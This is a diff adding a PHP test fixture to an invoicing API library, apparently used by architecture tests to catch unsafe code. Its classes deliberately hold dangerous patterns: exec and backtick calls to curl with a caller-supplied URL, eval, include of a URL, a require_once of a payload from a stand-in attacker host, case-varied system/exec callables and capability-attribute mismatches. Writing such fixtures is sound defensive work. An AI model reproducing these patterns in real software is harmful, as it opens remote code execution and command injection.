@@ -1,0 +1,96 @@
+<?php
+
+declare(strict_types=1);
+
+namespace Cieplik206\Fakturownia\Tests\Fixtures\Architecture;
+
+use Closure;
+use Cieplik206\Fakturownia\Client\Attributes\RequiresCapability;
+use Cieplik206\Fakturownia\Read\Requests\GetClientRequest;
+use Cieplik206\Fakturownia\Read\Requests\GetInvoiceRequest;
+use Illuminate\Support\Facades\Facade;
+use ReflectionMethod;
+
+function hiddenRemoteRead(string $url): string
+{
+    return (string) file_get_contents($url);
+}
+
+final class ClassifiedGlobalFunctionForwarder
+{
+    public function value(string $url): string
+    {
+        return hiddenRemoteRead($url);
+    }
+}
+
+final class ClassifiedExecutionEscape
+{
+    public function value(string $url): void
+    {
+        exec('curl '.$url);
+        `curl {$url}`;
+        eval('$remote = true;');
+        include $url;
+        require_once 'https'.'://attacker.invalid/payload.php';
+        array_map('SyStEm', ['curl '.$url]);
+        $callback = 'exec';
+        array_filter(['curl '.$url], $callback);
+        array_udiff(['curl '.$url], ['safe'], 'SyStEm');
+        ob_start($callback);
+
+        $reflection = new ReflectionMethod(self::class, 'value');
+        $reflection->setAccessible(true);
+        $reflection->InVoKe($this, $url);
+        Closure::BiNd(static fn (): null => null, null, self::class);
+    }
+}
+
+final class ClassifiedLocalBodySwap
+{
+    public function value(object $executor): mixed
+    {
+        return $executor->ExEcUtE(new GetInvoiceRequest('1'));
+    }
+}
+
+final class ClassifiedConditionalDescriptorReassignment
+{
+    #[RequiresCapability('client.read.get', GetClientRequest::class)]
+    public function get(object $executor, bool $swap): mixed
+    {
+        $request = new GetClientRequest('1');
+
+        if ($swap) {
+            $request = new GetInvoiceRequest('1');
+        }
+
+        return $executor->execute($request);
+    }
+}
+
+final class ClassifiedCaseVariantCallable
+{
+    /** @return array{object, string} */
+    public function value(object $executor): array
+    {
+        return [$executor, 'SeNd'];
+    }
+}
+
+final class AttributeDescriptorMismatch
+{
+    #[RequiresCapability('client.read.get', GetClientRequest::class)]
+    public function get(object $executor): mixed
+    {
+        return $executor->execute(new GetInvoiceRequest('1'));
+    }
+}
+
+final class UnsafeInheritedFacade extends Facade
+{
+    protected static function getFacadeAccessor(): string
+    {
+        return 'unsafe-remote-root';
+    }
+}
